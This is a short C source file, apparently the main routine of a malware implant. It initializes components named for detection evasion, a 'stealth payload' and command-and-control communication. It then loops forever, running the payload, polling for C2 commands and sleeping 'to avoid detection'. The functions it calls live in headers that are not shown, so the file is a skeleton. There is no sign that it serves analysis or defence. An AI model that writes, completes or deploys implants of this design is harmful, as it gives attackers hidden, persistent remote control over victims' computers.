#include <stdio.h>
#include "payload.h"
#include "evasion.h"
#include "c2_communication_fixed.h"
#include "config.h"

int main() {
    printf("Initializing stealth payload...\n");
    
    if (!init_evasion()) {
        printf("Evasion initialization failed\n");
        return 1;
    }
    
    if (!init_payload()) {
        printf("Payload initialization failed\n");
        return 1;
    }
    
    if (!init_c2_communication()) {
        printf("C2 communication initialization failed\n");
        return 1;
    }
    
    printf("Payload running successfully\n");
    
    while (1) {
        // Main payload loop
        run_payload();
        
        // Check for C2 commands
        check_c2_commands();
        
        // Sleep to avoid detection
        stealth_sleep(5000);
    }
    
    return 0;
}